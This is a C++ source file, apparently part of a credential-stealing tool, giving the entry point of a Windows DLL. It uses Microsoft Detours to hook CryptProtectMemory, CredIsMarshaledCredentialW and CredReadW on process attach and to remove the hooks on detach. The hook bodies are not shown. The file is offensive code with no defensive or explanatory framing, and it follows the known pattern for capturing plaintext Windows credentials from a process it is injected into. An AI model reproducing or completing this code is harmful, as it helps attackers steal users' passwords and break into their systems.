// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"
#include <Windows.h>
#include "detours.h"
#include <dpapi.h>
#include <wincred.h>
#include <strsafe.h>
#include <subauth.h>
#define SECURITY_WIN32 
#include <sspi.h>
#pragma comment(lib,"detours.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Secur32.lib")


BOOL APIENTRY DllMain(HMODULE hModule, DWORD  dwReason, LPVOID lpReserved)
{
	if (DetourIsHelperProcess()) {
		return TRUE;
	}

	if (dwReason == DLL_PROCESS_ATTACH) {
		DetourRestoreAfterWith();
		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());
		DetourAttach(&(PVOID&)OriginalCryptProtectMemory, _CryptProtectMemory);
		DetourAttach(&(PVOID&)OriginalCredIsMarshaledCredentialW, _CredIsMarshaledCredentialW);
		DetourAttach(&(PVOID&)OriginalCredReadW, HookedCredReadW);

		DetourTransactionCommit();
	}
	else if (dwReason == DLL_PROCESS_DETACH) {
		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());
		DetourDetach(&(PVOID&)OriginalCryptProtectMemory, _CryptProtectMemory);
		DetourDetach(&(PVOID&)OriginalCredIsMarshaledCredentialW, _CredIsMarshaledCredentialW);
		DetourDetach(&(PVOID&)OriginalCredReadW, HookedCredReadW);
		DetourTransactionCommit();

	}
	return TRUE;
}
